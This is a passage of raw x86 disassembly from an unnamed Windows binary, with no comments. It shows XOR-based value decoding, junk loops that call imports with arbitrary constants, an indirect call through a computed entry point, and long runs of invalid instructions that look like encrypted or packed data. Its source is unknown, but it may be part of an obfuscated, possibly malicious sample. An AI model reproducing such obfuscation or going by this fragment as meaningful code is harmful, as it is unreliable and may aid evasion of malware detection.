  409707:	mov    ecx,DWORD PTR [ebp+0x10]
  40970a:	mov    DWORD PTR ds:0x412280,ecx
  409710:	mov    ecx,DWORD PTR ds:0x41202c
  409716:	mov    edx,DWORD PTR [ebp-0x14]
  409719:	sub    ecx,edi
  40971b:	xor    ecx,esi
  40971d:	mov    DWORD PTR [edx],ecx
  40971f:	mov    ecx,DWORD PTR [ebp-0x18]
  409722:	cmp    ecx,0xf89c8532
  409728:	je     0x409785
  40972e:	mov    ecx,DWORD PTR [ebp-0x8]
  409731:	mov    edx,DWORD PTR [ebp-0x1c]
  409734:	xor    ecx,esi
  409736:	add    ecx,edi
  409738:	cmp    ecx,edx
  40973a:	je     0x409785
  409740:	mov    eax,ds:0x4121a8
  409745:	mov    eax,DWORD PTR [eax+0x194]
  40974b:	mov    ecx,DWORD PTR [eax]
  40974d:	mov    eax,DWORD PTR [ecx+0x3c]
  409750:	push   DWORD PTR ds:0x412280
  409756:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40975a:	push   DWORD PTR ds:0x41202c
  409760:	add    eax,ecx
  409762:	mov    ecx,DWORD PTR ds:0x4121a8
  409768:	mov    ecx,DWORD PTR [ecx+0x194]
  40976e:	push   DWORD PTR [ecx]
  409770:	call   eax
  409772:	mov    ecx,DWORD PTR ds:0x4121a8
  409778:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40977e:	mov    DWORD PTR [ecx],eax
  409780:	jmp    0x409895
  409785:	mov    ecx,DWORD PTR [ebp-0x8]
  409788:	mov    edx,DWORD PTR [ebp-0x20]
  40978b:	xor    ecx,esi
  40978d:	add    ecx,edi
  40978f:	cmp    ecx,edx
  409791:	jne    0x409878
  409797:	mov    ecx,DWORD PTR [ebp-0x8]
  40979a:	xor    ecx,esi
  40979c:	add    ecx,edi
  40979e:	mov    DWORD PTR ds:0x41222c,ecx
  4097a4:	mov    ecx,DWORD PTR [ebp-0x8]
  4097a7:	xor    ecx,esi
  4097a9:	add    ecx,edi
  4097ab:	mov    DWORD PTR ds:0x412224,ecx
  4097b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4097b4:	mov    DWORD PTR [ebp-0xc],ecx
  4097b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4097ba:	mov    DWORD PTR [ebp+0xc],ecx
  4097bd:	mov    ecx,DWORD PTR [ebp+0xc]
  4097c0:	xor    ecx,esi
  4097c2:	add    ecx,edi
  4097c4:	mov    DWORD PTR [ebp+0xc],ecx
  4097c7:	mov    ecx,DWORD PTR ds:0x412028
  4097cd:	mov    ecx,DWORD PTR [ecx]
  4097cf:	mov    DWORD PTR [ebp+0xc],ecx
  4097d2:	mov    ecx,DWORD PTR ds:0x412230
  4097d8:	mov    ecx,DWORD PTR [ecx]
  4097da:	mov    DWORD PTR [ebp-0x14],ecx
  4097dd:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  4097e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4097e7:	xor    ecx,esi
  4097e9:	add    ecx,edi
  4097eb:	mov    DWORD PTR [ebp+0x10],ecx
  4097ee:	mov    ecx,DWORD PTR ds:0x4121a8
  4097f4:	mov    DWORD PTR [ebp+0x10],ecx
  4097f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4097fa:	mov    DWORD PTR [ebp+0xc],ecx
  4097fd:	mov    ecx,DWORD PTR [ebp+0xc]
  409800:	push   0x4
  409802:	pop    edx
  409803:	sub    edx,ecx
  409805:	add    edx,DWORD PTR [ebp-0x14]
  409808:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40980f:	mov    DWORD PTR [ebp+0x10],edx
  409812:	mov    DWORD PTR [ebp-0x70],eax
  409815:	mov    eax,DWORD PTR [ebp+0xc]
  409818:	mov    DWORD PTR [ebp-0x6c],eax
  40981b:	mov    eax,DWORD PTR [ebp+0x10]
  40981e:	mov    DWORD PTR [ebp-0x68],eax
  409821:	mov    eax,DWORD PTR [ebp-0x24]
  409824:	xor    eax,esi
  409826:	add    eax,edi
  409828:	mov    DWORD PTR [ebp-0x64],eax
  40982b:	lea    eax,[ebp-0x2c]
  40982e:	mov    DWORD PTR [ebp-0x60],eax
  409831:	mov    eax,DWORD PTR [ebp-0x70]
  409834:	xor    eax,esi
  409836:	add    eax,edi
  409838:	mov    DWORD PTR [ebp-0x70],eax
  40983b:	lea    eax,[ebp-0x70]
  40983e:	push   eax
  40983f:	mov    eax,DWORD PTR [ebp-0xc]
  409842:	xor    eax,esi
  409844:	add    eax,edi
  409846:	push   eax
  409847:	mov    eax,ds:0x4121c8
  40984c:	push   0x41211e
  409851:	push   DWORD PTR [eax]
  409853:	call   0x40cdc5
  409858:	xor    esi,esi
  40985a:	mov    eax,DWORD PTR [ebp+0x10]
  40985d:	sub    eax,esi
  40985f:	push   eax
  409860:	mov    eax,DWORD PTR [ebp+0xc]
  409863:	add    eax,esi
  409865:	push   eax
  409866:	call   0x406a53
  40986b:	inc    esi
  40986c:	cmp    esi,0x52
  40986f:	jb     0x40985a
  409875:	mov    eax,DWORD PTR [ebp-0xc]
  409878:	call   0x4054ab
  40987d:	lea    eax,[ebp+0x4]
  409880:	mov    DWORD PTR [ebp-0x28],eax
  409883:	mov    eax,DWORD PTR [ebp-0x10]
  409886:	mov    eax,DWORD PTR [ebp-0x4]
  409889:	push   DWORD PTR [ebp-0x8]
  40988c:	lea    eax,[ebp-0x28]
  40988f:	push   eax
  409890:	call   0x40ccd9
  409895:	mov    eax,ds:0x4121a8
  40989a:	push   0x4
  40989c:	add    eax,0x1cc
  4098a1:	push   eax
  4098a2:	lea    eax,[ebp-0x10]
  4098a5:	push   eax
  4098a6:	call   0x4020d0
  4098ab:	mov    eax,DWORD PTR [ebp-0x10]
  4098ae:	mov    eax,DWORD PTR [eax]
  4098b0:	pop    edi
  4098b1:	pop    esi
  4098b2:	pop    ebx
  4098b3:	leave  
  4098b4:	ret    0xc
  4098b7:	push   ebp
  4098b8:	mov    ebp,esp
  4098ba:	sub    esp,0x24
  4098bd:	mov    eax,ds:0x4121a8
  4098c2:	xor    ecx,DWORD PTR ds:0x42e7c4
  4098c8:	mov    eax,DWORD PTR [eax+0x198]
  4098ce:	mov    DWORD PTR [ebp-0x8],eax
  4098d1:	mov    DWORD PTR ds:0x43045d,0x14
  4098db:	cmp    DWORD PTR ds:0x43045d,0x0
  4098e2:	je     0x40993f
  4098e8:	cmp    DWORD PTR ds:0x43045d,0x1b
  4098ef:	jne    0x40991f
  4098f5:	push   0x8cdb
  4098fa:	push   DWORD PTR [ebp-0x10]
  4098fd:	push   0x3afe
  409902:	push   0x5d4e
  409907:	push   DWORD PTR [ebp-0x10]
  40990a:	push   0x4817
  40990f:	push   0x7044
  409914:	push   0x34c1
  409919:	call   DWORD PTR ds:0x42ec33
  40991f:	mov    eax,ds:0x43045d
  409924:	dec    eax
  409925:	mov    ds:0x43045d,eax
  40992a:	jmp    0x4098db
  40992f:	mov    eax,ds:0x4304d7
  409934:	or     eax,DWORD PTR ds:0x4304df
  40993a:	mov    ds:0x4304d7,eax
  40993f:	mov    eax,DWORD PTR [ebp+0x8]
  409942:	mov    DWORD PTR ds:0x42e7d0,0x13
  40994c:	cmp    DWORD PTR ds:0x42e7d0,0x0
  409953:	je     0x40998b
  409959:	cmp    DWORD PTR ds:0x42e7d0,0x19
  409960:	jne    0x409979
  409966:	push   0x7ebc
  40996b:	push   0x1c7b
  409970:	push   DWORD PTR [ebp-0x10]
  409973:	call   DWORD PTR ds:0x42ec37
  409979:	mov    ecx,DWORD PTR ds:0x42e7d0
  40997f:	dec    ecx
  409980:	mov    DWORD PTR ds:0x42e7d0,ecx
  409986:	jmp    0x40994c
  40998b:	mov    ecx,DWORD PTR [ebp-0x8]
  40998e:	xor    DWORD PTR ds:0x430449,0x600e
  409998:	push   ebx
  409999:	push   esi
  40999a:	mov    esi,0x7510854
  40999f:	xor    eax,esi
  4099a1:	xor    DWORD PTR ds:0x430459,ebx
  4099a7:	push   edi
  4099a8:	and    DWORD PTR ds:0x4304cf,0x0
  4099b2:	mov    edi,DWORD PTR ds:0x4304cf
  4099b8:	inc    edi
  4099b9:	mov    DWORD PTR ds:0x4304cf,edi
  4099bf:	cmp    DWORD PTR ds:0x4304cf,0x8
  4099c6:	jne    0x4099e8
  4099cc:	push   0x43043d
  4099d1:	push   DWORD PTR [ebp-0x24]
  4099d4:	push   DWORD PTR [ebp-0x1c]
  4099d7:	push   DWORD PTR [ebp-0x28]
  4099da:	push   DWORD PTR [ebp-0x28]
  4099dd:	push   0x8706
  4099e2:	call   DWORD PTR ds:0x42eac7
  4099e8:	cmp    DWORD PTR ds:0x4304cf,0x7
  4099ef:	jne    0x409a02
  4099f5:	mov    edi,DWORD PTR ds:0x4304cf
  4099fb:	inc    edi
  4099fc:	mov    DWORD PTR ds:0x4304cf,edi
  409a02:	cmp    DWORD PTR ds:0x4304cf,0x16
  409a09:	jb     0x4099b2
  409a0f:	add    DWORD PTR ds:0x4304df,0x13b8
  409a19:	mov    edi,0x32729b
  409a1e:	and    DWORD PTR ds:0x430435,0x0
  409a28:	mov    ebx,DWORD PTR ds:0x430435
  409a2e:	inc    ebx
  409a2f:	mov    DWORD PTR ds:0x430435,ebx
  409a35:	cmp    DWORD PTR ds:0x430435,0xe
  409a3c:	jne    0x409a50
  409a42:	push   DWORD PTR [ebp-0x18]
  409a45:	push   0x6c31
  409a4a:	call   DWORD PTR ds:0x42ea03
  409a50:	cmp    DWORD PTR ds:0x430435,0xd
  409a57:	jne    0x409a6a
  409a5d:	mov    ebx,DWORD PTR ds:0x430435
  409a63:	inc    ebx
  409a64:	mov    DWORD PTR ds:0x430435,ebx
  409a6a:	cmp    DWORD PTR ds:0x430435,0x18
  409a71:	jb     0x409a28
  409a77:	mov    ebx,DWORD PTR ds:0x42e7c8
  409a7d:	or     DWORD PTR ds:0x42edcb,ebx
  409a83:	jmp    0x409dd0
  409a88:	pop    eax
  409a89:	push   edi
  409a8a:	lods   al,BYTE PTR ds:[esi]
  409a8b:	sahf   
  409a8c:	mov    cl,0x65
  409a8e:	push   0x8aa37451
  409a93:	push   ebx
  409a94:	in     eax,0x6c
  409a96:	(bad)  
  409a97:	xchg   ebx,eax
  409a98:	pop    ecx
  409a99:	fdivr  QWORD PTR [esi+0x7e]
  409a9c:	cs jge 0x409b1d
  409a9f:	jle    0x409b0d
  409aa1:	mov    eax,ds:0x5107dd9e
  409aa6:	in     al,dx
  409aa7:	das    
  409aa8:	shl    bh,0xf1
  409aab:	js     0x409a6c
  409aad:	mov    dh,0x19
  409aaf:	retf   
  409ab0:	mov    ecx,0x6139d6af
  409ab5:	loope  0x409ab6
  409ab7:	lahf   
  409ab8:	js     0x409a93
  409aba:	adc    eax,0xf6ef6444
  409abf:	(bad)  
  409ac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ac1:	xor    ebx,DWORD PTR [eax]
  409ac3:	int3   
  409ac4:	push   edi
  409ac5:	dec    esi
  409ac6:	dec    edx
  409ac7:	ret    0x8d81
  409aca:	popf   
  409acb:	mov    ecx,DWORD PTR [esp+eiz*8+0x79]
  409acf:	sar    ah,0xad
  409ad2:	push   cs
  409ad3:	push   esp
  409ad4:	xor    BYTE PTR [edx],bl
  409ad6:	jnp    0x409b43
  409ad8:	sub    ebx,DWORD PTR ds:0xb98bb601
  409ade:	dec    eax
  409adf:	jge    0x409a80
  409ae1:	xor    DWORD PTR [ebp+0x7b9ae54d],ebp
  409ae7:	pop    ebx
  409ae8:	int    0xe4
  409aea:	adc    dl,bl
  409aec:	je     0x409b4e
  409aee:	stos   BYTE PTR es:[edi],al
  409aef:	imul   esp,DWORD PTR [ebx+0x29ed6727],0xffffff90
  409af6:	fild   QWORD PTR [edi+0x1]
  409af9:	mov    al,0x92
  409afb:	push   cs
  409afc:	sbb    dl,al
  409afe:	push   eax
  409aff:	pusha  
  409b00:	fisub  WORD PTR [eax-0x6a7ec92a]
  409b06:	and    BYTE PTR [esi-0x18],al
  409b09:	or     BYTE PTR [ebx-0x31],ch
  409b0c:	adc    bl,dh
  409b0e:	cmp    BYTE PTR [edi-0x54e6bc93],ch
  409b14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b15:	inc    eax
  409b16:	fistp  DWORD PTR [edi+ebp*4]
  409b19:	add    edx,DWORD PTR [edx+eax*2]
  409b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b1d:	and    edx,DWORD PTR [ebx+0x4b]
  409b20:	cdq    
  409b21:	js     0x409b02
  409b23:	fwait
  409b24:	popa   
  409b25:	dec    esi
  409b26:	mov    ch,al
  409b28:	jnp    0x409ac4
  409b2a:	mov    edx,0x8085d6cf
  409b2f:	xchg   edi,eax
  409b30:	push   cs
  409b31:	and    eax,0x7568cfa8
  409b36:	or     BYTE PTR [ecx+0x60],0xf7
  409b3a:	retf   0xd902
  409b3d:	int3   
  409b3e:	js     0x409b83
  409b40:	xchg   esi,eax
  409b41:	xor    DWORD PTR [edi-0xc],ecx
  409b44:	pop    es
  409b45:	test   bh,ch
  409b47:	inc    ebp
  409b48:	cld    
  409b49:	jp     0x409b3f
  409b4b:	je     0x409b65
  409b4d:	inc    BYTE PTR [ecx]
  409b4f:	sahf   
  409b50:	jnp    0x409b52
  409b52:	cld    
  409b53:	sbb    BYTE PTR cs:[ebx-0x1ee600e1],ch
  409b5a:	adc    dh,cl
  409b5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b5d:	mov    ch,0x3d
  409b5f:	stc    
  409b60:	pop    edx
  409b61:	push   eax
  409b62:	xor    eax,0xa299dafe
  409b67:	push   edi
  409b68:	iret   
  409b69:	in     eax,dx
  409b6a:	scas   al,BYTE PTR es:[edi]
  409b6b:	jne    0x409bac
  409b6d:	ret    0x59a3
  409b70:	in     al,dx
  409b71:	pop    es
  409b72:	push   ds
  409b73:	pop    ecx
  409b74:	mov    dh,0x4b
  409b76:	mul    DWORD PTR [eax-0x2c117a3d]
  409b7c:	(bad)  
  409b7d:	lds    esi,FWORD PTR [esi+0x33c84ed4]
  409b83:	lods   al,BYTE PTR ds:[esi]
  409b84:	out    dx,eax
  409b85:	mov    eax,ds:0x3f242319
  409b8a:	fidiv  DWORD PTR [esp+edi*1]
  409b8d:	lods   eax,DWORD PTR ds:[esi]
  409b8e:	cmp    eax,0xa4106379
  409b93:	dec    ebx
  409b94:	xor    eax,0xe59f8f74
  409b99:	dec    eax
  409b9a:	sbb    eax,0x46042d27
  409b9f:	and    al,0x98
  409ba1:	push   ds
  409ba2:	cs dec eax
  409ba4:	pop    ecx
  409ba5:	mov    dl,0x7d
  409ba7:	dec    edi
  409ba8:	leave  
  409ba9:	stos   BYTE PTR es:[edi],al
  409baa:	mov    esp,0x38010fc
  409baf:	(bad)  
  409bb0:	ror    DWORD PTR [edi],1
  409bb2:	aaa    
  409bb3:	xor    al,0xae
  409bb5:	mov    cl,0x1f
  409bb7:	(bad)  
  409bb8:	lods   eax,DWORD PTR ds:[esi]
  409bb9:	cmp    DWORD PTR [edx+0x8],esi
  409bbc:	adc    DWORD PTR [ecx+0x68],ecx
  409bbf:	lahf   
  409bc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bc1:	dec    ebp
  409bc2:	add    DWORD PTR [ebp+0x48593442],ebp
  409bc8:	adc    al,0x6a
  409bca:	(bad)
  409bd0:	push   es
  409bd1:	adc    ch,cl
  409bd3:	cmp    ch,cl
  409bd5:	jge    0x409b8e
  409bd7:	popa   
  409bd8:	stos   BYTE PTR es:[edi],al
  409bd9:	jle    0x409c2f
  409bdb:	sbb    eax,DWORD PTR [ebp-0x15]
  409bde:	xor    edi,DWORD PTR [ecx]
  409be0:	push   0xcba28e93
  409be5:	sbb    edi,ebx
  409be7:	pushf  
  409be8:	xor    DWORD PTR ds:0xfb28aa23,esp
  409bee:	sahf   
  409bef:	add    ecx,DWORD PTR [edx-0xc]
  409bf2:	neg    DWORD PTR [ebp+eax*8-0x44]
  409bf6:	xor    eax,DWORD PTR [ecx]
  409bf8:	xchg   ebx,eax
  409bf9:	jge    0x409b95
  409bfb:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  409bfd:	and    BYTE PTR [ecx+eiz*1],ah
  409c00:	data16 adc dl,BYTE PTR [ebx-0x7803e042]
  409c07:	stc    
  409c08:	push   edi
  409c09:	sub    eax,0x8c55d94c
  409c0e:	or     dh,al
  409c10:	jb     0x409bad
  409c12:	push   ebp
  409c13:	jg     0x409bb4
  409c15:	js     0x409ba8
  409c17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c18:	jl     0x409c23
  409c1a:	and    al,BYTE PTR [edi+0x35]
  409c1d:	(bad)  
  409c1e:	clc    
  409c1f:	scas   al,BYTE PTR es:[edi]
  409c20:	daa    
  409c21:	js     0x409c2d
  409c23:	lods   eax,DWORD PTR ds:[esi]
  409c24:	out    0xce,eax
  409c26:	adc    eax,0x3dc3b457
  409c2b:	scas   eax,DWORD PTR es:[edi]
  409c2c:	xor    eax,0xf068be36
  409c31:	test   BYTE PTR [ecx+0x276d3517],al
  409c37:	out    0x81,al
  409c39:	cmp    dh,bh
  409c3b:	cli    
  409c3c:	jl     0x409cb8
  409c3e:	jecxz  0x409c64
  409c40:	and    eax,0xc2704237
  409c45:	rcl    ecx,1
  409c47:	dec    ebp
  409c48:	clc    
  409c49:	lock xchg BYTE PTR [eax],ah
  409c4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c4d:	or     DWORD PTR [edx-0x70],esp
  409c50:	inc    edx
  409c51:	xchg   BYTE PTR [ebp+0x4ee04ffe],ch
  409c57:	ficom  WORD PTR [edx]
  409c59:	jecxz  0x409c9c
  409c5b:	je     0x409cc2
  409c5d:	dec    ebp
  409c5e:	jno    0x409c9e
  409c60:	add    DWORD PTR [ecx+0x474d79a7],ebp
  409c66:	test   al,0x65
  409c68:	hlt    
  409c69:	jo     0x409cba
  409c6b:	fs add eax,0x1c802b96
  409c71:	xchg   ebp,eax
  409c72:	fnstenv [edx+0x2c9860b9]
  409c78:	(bad)  
  409c79:	mov    ?,ebx
  409c7b:	and    DWORD PTR [ebx],ebp
  409c7d:	loop   0x409c78
  409c7f:	mov    ebx,0x4849e201
  409c84:	mov    eax,0x6a0dc913
  409c89:	inc    esp
  409c8a:	mov    al,ds:0x851ef9c1
  409c8f:	jne    0x409c2c
  409c91:	fs mov cl,0x4e
  409c94:	call   0x70202b9c
  409c99:	pop    eax
  409c9a:	dec    edx
  409c9b:	fld    QWORD PTR [esi-0x75ae2c8c]
  409ca1:	ds push esp
  409ca3:	mov    ebx,0x652110ba
  409ca8:	push   ebx
  409ca9:	sbb    ecx,0xffffff94
  409cac:	pop    ss
  409cad:	inc    eax
  409cae:	fistp  WORD PTR [ebx+eax*2]
  409cb1:	jno    0x409d1b
  409cb3:	mov    esi,0xd04afc71
  409cb8:	xchg   ebx,eax
  409cb9:	pop    ss
  409cba:	icebp  
  409cbb:	add    esp,edx
  409cbd:	js     0x409d03
  409cbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cc0:	stos   DWORD PTR es:[edi],eax
  409cc1:	(bad)  
  409cc2:	dec    ebp
  409cc3:	push   ss
  409cc4:	in     eax,dx
  409cc5:	mov    ds:0x4d1a5903,al
  409cca:	add    al,BYTE PTR [edi-0x18]
  409ccd:	mov    edi,0x9be7f3b0
  409cd2:	sub    BYTE PTR [edx+edx*4-0x15e7b7fe],dh
  409cd9:	push   ss
  409cda:	inc    esp
  409cdb:	addr16 sti 
  409cdd:	repz retf 0xfa69
  409ce1:	mov    ds:0x58f47150,eax
  409ce6:	je     0x409ceb
  409ce8:	les    ecx,FWORD PTR [edi+0x3e]
  409ceb:	add    BYTE PTR [eax+0x54],ch
  409cee:	rcr    esp,1
  409cf0:	xchg   edi,eax
  409cf1:	test   eax,0x609f4528
  409cf6:	gs fwait
  409cf8:	add    BYTE PTR [edx],ch
  409cfa:	cmp    eax,0x64de61a9
  409cff:	popa   
  409d00:	add    BYTE PTR [edx-0x42],0xcc
  409d04:	jge    0x409cce
  409d06:	push   eax
  409d08:	mov    bl,BYTE PTR [ebx]
  409d0a:	sub    eax,0x5b4c48db
  409d0f:	fucomp st(4)
  409d11:	lea    edx,[ebp-0xfe6a881]
  409d17:	xor    DWORD PTR [eax],0x4f406582
  409d1d:	(bad)  
  409d1e:	call   0xf888749a
  409d23:	ja     0x409d1a
  409d25:	call   0x37e332ff
  409d2a:	sub    eax,0xae0db9f2
  409d2f:	dec    esi
  409d30:	adc    ebp,DWORD PTR [edi-0x7f]
  409d33:	pushf  
  409d34:	fbld   TBYTE PTR [edx-0x5348b42f]
  409d3a:	scas   eax,DWORD PTR es:[edi]
  409d3b:	jmp    0x409cf3
  409d3d:	lahf   
  409d3e:	jnp    0x409d0b
  409d40:	stos   DWORD PTR es:[edi],eax
  409d41:	sub    eax,0x16de1ce9
  409d46:	pop    ecx
  409d47:	test   al,0x95
  409d49:	cli    
  409d4a:	lock inc edi
  409d4c:	jmp    0x5b6da062
  409d51:	add    eax,0x3bfee0b7
  409d56:	mov    ds:0xc75de3b2,eax
  409d5b:	and    BYTE PTR [ebp+0x37],bl
  409d5e:	jp     0x409d58
  409d60:	cmp    ch,al
  409d62:	push   edi
  409d63:	addr16 mov al,0x99
  409d66:	ret    
  409d67:	shl    BYTE PTR [eax+0x7a],cl
  409d6a:	out    dx,al
  409d6b:	xor    ebp,DWORD PTR [esp+edi*2+0x6b]
  409d6f:	gs jle 0x409d43
  409d72:	dec    ebx
  409d73:	out    0xde,eax
  409d75:	mov    cl,0x4f
  409d77:	mov    dh,0x68
  409d79:	cwde   
  409d7a:	mov    ebx,0xf4d39ba9
  409d7f:	shl    DWORD PTR [esi-0x1241f2df],0x1e
  409d86:	xor    dl,BYTE PTR [edi+0x32]
  409d89:	cmp    ch,BYTE PTR [edx-0x733f14de]
  409d8f:	lock cli 
  409d91:	fdivr  DWORD PTR [edx+0x53]
  409d94:	outs   dx,BYTE PTR ds:[esi]
  409d95:	ds mov dh,0xab
  409d98:	in     al,dx
  409d99:	es jmp 0x409dd1
  409d9c:	(bad)  
  409d9d:	test   eax,0xd8e4505b
  409da2:	in     eax,dx
  409da3:	push   esp
  409da4:	gs and al,0xbb
  409da7:	pusha  
  409da8:	cdq    
  409da9:	lea    ecx,[edi+0x7]
  409dac:	or     al,0xe9
  409dae:	iret   
  409daf:	(bad)  
  409db0:	sbb    eax,0x4db52c4b
  409db5:	lods   al,BYTE PTR ds:[esi]
  409db6:	push   ecx
  409db7:	scas   al,BYTE PTR es:[edi]
  409db8:	adc    ebx,ebp
  409dba:	loopne 0x409db2
  409dbc:	jae    0x409e1c
  409dbe:	inc    ebx
  409dbf:	out    dx,al
  409dc0:	or     DWORD PTR [eax],ebx
  409dc2:	(bad)  
  409dc3:	and    DWORD PTR [ebx+eax*4],ebx
  409dc6:	mov    bl,0x56
  409dc8:	outs   dx,DWORD PTR ds:[esi]
  409dc9:	aaa    
  409dca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dcb:	mov    ebp,0xd56c6775
  409dd0:	add    eax,edi
  409dd2:	mov    ebx,DWORD PTR ds:0x42e7d8
  409dd8:	add    ebx,DWORD PTR ds:0x4304d7
  409dde:	mov    DWORD PTR ds:0x42e7d8,ebx
  409de4:	mov    DWORD PTR [ecx],eax
  409de6:	add    DWORD PTR ds:0x43045d,0xe83
  409df0:	lea    eax,[ebp-0x4]
  409df3:	sub    DWORD PTR ds:0x4304cf,ecx
  409df9:	mov    DWORD PTR [ebp-0x10],eax
  409dfc:	movzx  ebx,WORD PTR ds:0x430451
  409e03:	and    DWORD PTR ds:0x430471,ebx
  409e09:	mov    eax,DWORD PTR [ebp+0x8]
  409e0c:	add    DWORD PTR ds:0x43044d,0x3f18
  409e16:	mov    ecx,DWORD PTR [ebp-0x10]
  409e19:	jmp    0x40a166
  409e1e:	scas   al,BYTE PTR es:[edi]
  409e1f:	mov    ebx,0x35712771
  409e24:	push   0x30b4a53
  409e29:	jb     0x409dea
  409e2b:	mov    dl,0x6
  409e2d:	push   0x9
  409e2f:	fdivr  DWORD PTR [esi+0x7e]
  409e32:	cs jge 0x409eb3
  409e35:	jle    0x409e4a
  409e37:	pop    ecx
  409e38:	mov    ?,WORD PTR gs:[edi-0xa]
  409e3c:	(bad)  
  409e3d:	sub    eax,DWORD PTR [edx]
  409e3f:	pop    ebx
  409e40:	call   0x1d8a4b71
  409e45:	and    edi,ebp
  409e47:	jg     0x409eae
  409e49:	cmp    BYTE PTR [ebx+eiz*8-0x4d356228],dl
  409e50:	aas    
  409e51:	xor    BYTE PTR [eax-0x73],dl
  409e54:	rcl    DWORD PTR [esi-0x10],cl
  409e57:	mov    edx,DWORD PTR [esi-0x685fa4ff]
  409e5d:	jno    0x409e67
  409e5f:	js     0x409e8f
  409e61:	adc    edi,DWORD PTR [esi+ebp*4-0x31]
  409e65:	test   DWORD PTR cs:[edi+0x4e],ebx
  409e69:	(bad)  
  409e6a:	in     al,dx
  409e6b:	mov    ah,0x52
  409e6d:	in     eax,dx
  409e6e:	cmp    al,0xef
  409e70:	xor    al,0x55
  409e72:	pop    edx
  409e73:	push   edi
  409e74:	inc    edx
  409e75:	pop    edx
  409e76:	les    ecx,FWORD PTR ds:0x4df58699
  409e7c:	sti    
  409e7d:	dec    BYTE PTR [esi+0x10a245bb]
  409e83:	sbb    BYTE PTR [esi+0x21683d59],bl
  409e89:	push   ecx
  409e8a:	adc    al,0xdc
  409e8c:	test   DWORD PTR [eax+0x60],edi
  409e8f:	and    dh,bh
  409e91:	cld    
  409e92:	loop   0x409ec8
  409e94:	nop
  409e95:	out    dx,al
  409e96:	popa   
  409e97:	mov    eax,0x988785ad
  409e9c:	xor    eax,0xf66d230f
  409ea1:	fld    DWORD PTR fs:[ebx]
  409ea4:	sahf   
  409ea5:	sbb    al,0x16
  409ea7:	lods   al,BYTE PTR ds:[esi]
  409ea8:	sbb    ebp,0x1ac82ab1
  409eae:	mov    eax,ds:0x14c48bde
  409eb3:	adc    BYTE PTR [edx],dl
  409eb5:	fidiv  WORD PTR es:[edx+0x5e]
  409eb9:	jae    0x409e8c
  409ebb:	xor    DWORD PTR [edx+eiz*8-0x2084d1af],eax
  409ec2:	test   DWORD PTR [ecx+0x7f],ebx
  409ec5:	hlt    
  409ec6:	adc    BYTE PTR [esi-0x7a],bl
  409ec9:	add    dl,BYTE PTR [ebx+0x261f8e87]
  409ecf:	bound  esp,QWORD PTR [edi+0x3c]
  409ed2:	test   eax,0xe18de02b
  409ed7:	or     esi,DWORD PTR [ecx+0x35]
  409eda:	push   0x1c
  409edc:	(bad)  
  409edd:	inc    DWORD PTR [esi+0x6d]
  409ee0:	pop    es
  409ee1:	mov    bl,0x97
  409ee3:	retf   
  409ee4:	sub    cl,BYTE PTR [ecx-0x5f7b35de]
  409eea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409eeb:	or     esp,edx
  409eed:	dec    ecx
  409eee:	xchg   ecx,eax
  409eef:	sahf   
  409ef0:	pop    ss
  409ef1:	jo     0x409ef5
  409ef3:	push   ecx
  409ef4:	inc    eax
  409ef5:	adc    al,0x2
  409ef8:	mov    ds:0xe05b63b3,eax
  409efd:	jecxz  0x409eec
  409eff:	test   eax,0x805691d7
  409f04:	out    0xaa,al
  409f06:	stc    
  409f07:	out    dx,al
  409f08:	popf   
  409f09:	pop    ebp
  409f0a:	popa   
  409f0b:	push   ds
  409f0c:	adc    DWORD PTR [edi-0x20],0xffffffd6
  409f10:	jno    0x409f21
  409f12:	sub    al,0xf2
  409f15:	outs   dx,DWORD PTR ds:[esi]
  409f16:	mov    ecx,0x4b28192d
  409f1b:	jmp    0x65d:0x4b9fc649
  409f22:	mov    ah,0x99
  409f24:	push   0xebe2d805
  409f29:	push   0x5846da34
  409f2e:	fiadd  DWORD PTR [ebx-0x3ec729e7]
  409f34:	jle    0x409f25
  409f36:	jl     0x409fa8
  409f38:	ffree  st(4)
  409f3a:	call   0xcac0:0xc2fdbbd7
  409f41:	xchg   ebp,eax
  409f42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f43:	cmp    al,0xd9
  409f45:	test   DWORD PTR [ebx+0x38c89610],ecx
  409f4b:	repz mov dl,0x45
  409f4e:	cmp    dh,BYTE PTR [esi-0x4de777e5]
  409f54:	xor    eax,0x3ea562f8
  409f59:	cdq    
  409f5a:	ss clc 
  409f5c:	inc    esp
  409f5d:	popa   
  409f5e:	test   eax,0x4dbbeb6a
  409f63:	cmp    eax,0x70d2e6f
  409f68:	jmp    0x409fbf
  409f6a:	add    al,BYTE PTR [edx-0x5acfec00]
  409f70:	xchg   edx,eax
  409f71:	mov    ds:0x2b8ad24,eax
  409f76:	fimul  DWORD PTR [ebx+edx*2-0x51]
  409f7a:	test   DWORD PTR [edx-0x6],edx
  409f7d:	rcl    BYTE PTR [esi-0x5b00e2ed],1
  409f83:	pop    ecx
  409f84:	out    0x65,eax
  409f86:	xchg   edi,eax
  409f87:	add    esp,DWORD PTR [ecx+eax*4-0x28]
  409f8b:	xchg   esp,eax
  409f8c:	fimul  WORD PTR [ebp-0x32631c94]
  409f92:	aam    0xb2
  409f94:	push   ecx
  409f95:	test   esp,0xd48da8a
  409f9b:	xchg   ecx,eax
  409f9c:	pop    ecx
  409f9d:	aad    0x94
  409f9f:	jmp    0x903b:0xa6acb467
  409fa6:	bound  eax,QWORD PTR [ecx-0x19]
  409fa9:	inc    ebp
  409faa:	push   ds
  409fab:	in     eax,0xe9
  409fad:	jnp    0x409f74
  409faf:	pop    ebp
